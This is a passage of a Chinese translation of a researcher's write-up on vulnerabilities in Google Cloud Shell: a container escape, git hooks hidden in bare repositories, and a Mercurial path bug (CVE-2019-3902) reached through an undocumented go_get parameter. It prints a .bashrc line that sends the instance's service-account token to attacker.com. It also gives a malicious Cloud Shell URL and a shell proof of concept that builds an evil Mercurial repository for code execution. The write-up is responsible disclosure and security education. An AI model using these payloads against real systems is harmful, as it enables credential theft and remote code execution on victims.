/rootfs`。搜索文件系统后，很明显主机实例处于与预期不同的状态。尽管托管自定义Docker映像的容器具有一个空的`/home
/user`文件夹，但`dmesg`和`mount`命令清楚地表明，包含用户的home文件夹的永久磁盘仍附加到基础实例！
## 利用它
有了以上知识，任何攻击者现在都可以构建恶意的Docker映像。该恶意Docker映像可以在启动时使用与上面显示的相同的技术来逃逸到主机。逃逸到主机后，恶意映像可能会窃取用户主文件夹中的内容。
此外，攻击可能会向用户的主文件夹中写入任意内容，以试图窃取凭据，例如，通过将以下代码添加到`/var/google/devshell-home/.bashrc`中
    curl -H"Metadata-flavor: Google" http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token > /tmp/token.json
    curl -X POST -d@/tmp/token.json https://attacker.com/api/tokenupload
# BUG3 - Git clone
### 介绍
在本系列文章的[#Bug 1](https://offensi.com/2019/12/16/5-google-cloud-shell-bugs-explained-bug-1/)中，我们讨论了将`cloudshell_git_repo`GET-repo附加到Cloud Shell
URL以便克隆Github或Bitbucket存储库的可能性。除了此参数外，我们还可以指定`cloudshell_git_branch`和`cloudshell_working_dir`参数以帮助克隆过程。
这是如何运作的？当我们将上面列出的这三个参数传递给Cloud Shell URL时，在您的终端窗口内部将调用cloudshell_open
bash函数。此功能在`/google/devshell/bashrc.google.d/cloudshell_open.sh`中定义。我在下面列出了最重要的代码行的功能。
    function cloudshell_open {
    ... 
    git clone -- "$cloudshell_git_repo" "$target_directory"
    cd "$cloudshell_working_dir"
    git checkout "$cloudshell_git_branch"
    ...
    }
我们看到`git clone`是针对cloudshell_git_repo
GET参数中指定的URL执行的。然后，该脚本通过cd进入cloudshell_working_dir中指定的任何目录来更改工作目录。然后在指定的git分支上调用`git
checkout`。考虑到所有输入参数均已正确过滤的事实，一开始这似乎无害。
## GIT-HOOKS
Git-hooks是自定义脚本，在执行重要操作时会触发。在您运行`git init`时默认创建的git-hooks存储在`.git /
hooks`中，可能看起来与此类似。
如果我们可以将这些自定义脚本存储在一个恶意的存储库中并在受害人的Cloud Shell执行'git
checkout'时执行它们，那会很酷吗？根据Git手册，这是不可能的。这些 hooks 是客户端 hooks
。隐藏在`.git/`中的所有内容都将被忽略，因此不会复制到远程仓库中。
## BARE REPOSITORIES 裸仓库
创建存储库的标准方法是使用`git
init`。这将使用众所周知的布局创建一个工作库。它包含一个`.git/`目录，其中存储了所有修订历史记录和元数据，还包含您正在使用的文件的检出版本。
但是，还有一种可以存储存储库的格式。它称为`BARE
REPOSITORIES`裸仓库。这种类型的存储库通常用于共享，并且具有某种平面布局。可以通过运行`git init –bare`命令来创建它。
## 漏洞利用
在屏幕截图中，您可以清楚地看到我们刚刚创建了一个git
repo，没有`.git`目录，但是带有`hooks`目录！这意味着，如果我们将存储在裸存储库中的钩子隐藏在`普通`存储库子目录中，则可以将其推送到远程存储库。还记得cloudshell_function中的`cd`命令吗？我们可以跳到所需的任何子目录并执行`git
checkout`，然后触发存在的钩子。
我发布了此漏洞的概念证明，供您在 
中查看。按照自述文件中的指定在此存储库上运行git clone和检出将执行无害的检出钩子。
以Cloud Shell受害者为目标的邪恶URL看起来像这样：
[https://ssh.cloud.google.com/console/editor?cloudshell_git_repo=https://github.com/offensi/git-poc&cloudshell_git_branch=master&cloudshell_working_dir=evilgitdirectory](https://ssh.cloud.google.com/console/editor?cloudshell_git_repo=https://github.com/offensi/git-poc&cloudshell_git_branch=master&cloudshell_working_dir=evilgitdirectory)
在下面的屏幕截图中可以看到成功的利用。
# BUG4 - Go and get pwned
## 介绍
在审核Javascript代码时，这与使用Cloud Shell时负责浏览器中所有客户端的工作有关，我注意到有些不同寻常。
处理所有GET参数的代码列出了[官方文档中](https://cloud.google.com/shell/docs/open-in-cloud-shell) 没有的参数。
    var B3b = {
            CREATE_CUSTOM_IMAGE: "cloudshell_create_custom_image",
            DIR: "cloudshell_working_dir",
            GIT_BRANCH: "cloudshell_git_branch",
            GIT_REPO: "cloudshell_git_repo",
            GO_GET_REPO: "cloudshell_go_get_repo",
            IMAGE: "cloudshell_image",
            OPEN_IN_EDITOR: "cloudshell_open_in_editor",
            PRINT: "cloudshell_print",
            TUTORIAL: "cloudshell_tutorial"
        };
除`cloudshell_go_get_repo` GET参数外，以上列出的所有参数均在文档中列出并说明。当使用此参数
构建Cloud Shell URL时，再次调用cloudshell_open函数。
负责处理`go get`命令的代码如下。
    function cloudshell_open {
    ...
    valid_url_chars="[a-zA-Z0-9/\._:\-]*"
    ...
     if [[ -n "$cloudshell_go_get_repo" ]]; then
        valid_go_get=$(echo $cloudshell_go_get_repo | grep -e "^$valid_url_chars$")
        if [[ -z "$valid_go_get" ]]; then
          echo "Invalid go_get"
          return
        fi
    ...
    go get -- "$cloudshell_go_get_repo"
    go_src="$(go env GOPATH | cut -d ':' -f 1)/src/$go_get"
所有输入似乎已正确过滤。不过，我记下了这一点。
## 容器漏洞扫描
几个月后，我在Google的Container
Registry（gcr.io）中寻找漏洞。它提供的功能之一称为漏洞扫描。启用漏洞扫描后，将扫描您推送的每个Docker映像，以查找已知的漏洞和披露。发现新漏洞后，容器注册表会检查它们是否影响其他的映像。
我以前一直在用的Docker映像之一是
Shell映像。我已经可以在本地Docker引擎上轻松获得此映像，因此我将其推送到扫描中以检查漏洞扫描功能的运行情况。
打开针对Cloud Shell图像的扫描结果后，我有些惊讶。Cloud Shell映像似乎包含500多个漏洞。
在检查了列出的几乎所有漏洞之后，我终于找到了一个看起来对我来说有趣且有用的漏洞：[CVE-2019-3902](https://security-tracker.debian.org/tracker/CVE-2019-3902)。
## 利用CVE-2019-3902
CVE-2019-3902描述了Mercurial中的漏洞。由于Mercurial /
HG客户端的路径检查逻辑中存在漏洞，恶意存储库可以在客户端文件系统上的存储库边界之外写入文件。我知道`go
get`命令能够处理几种类型的存储库：svn，bzr，git和HG！
由于没有针对CVE-2019-3902的公共漏洞利用程序，因此我不得不尝试对其进行重现。我下载了Mercurial源代码的2个版本：修补版本和未修补版本。希望比较两个可以为我提供一些如何利用它的线索。
在检查修补的Mercurial源代码时，我偶然发现了存储在/ tests /目录中的自动测试用例。基于这些测试，我能够重建漏洞利用程序。
    #!/bin/sh
    # PoC for Google VRP by PI:EMAIL
    mkdir hgrepo
    hg init hgrepo/root
    cd hgrepo/root
    ln -s ../../../bin
    hg ci -qAm 'add symlink "bin"'
    hg init ../../../bin
    echo 'bin = bin' >> .hgsub
    hg ci -qAm 'add subrepo "bin"'
    cd ../../../bin
    echo '#!/bin/sh' >> cut
    echo 'wall You have been pwned!' >> cut
    chmod +x cut
    hg add cut
    hg commit -m "evil cut bin"
    cd /var/www/html/hgrepo/root
    hg commit -m "final"
上面的代码构建了一个恶意存储库。当易受攻击的hg客户端克隆此存储库时，会将名为`cut`的恶意文件写入`../../../bin`。当我们查看`cloudshell_open`函数之前，我们看到在`go
get`克隆恶意存储库之后立即调用了`cut`命令，因此执行了任意代码。
恶意存储库存储在个人Web服务器上 go.offensi.com/hgrepo 。恶意的go.html文件放置在网络服务器的根目录中，以指示`go
get`命令克隆Mercurial存储库。
现在，可以通过打开以下链接来诱骗任何Cloud
Shell用户执行任意代码：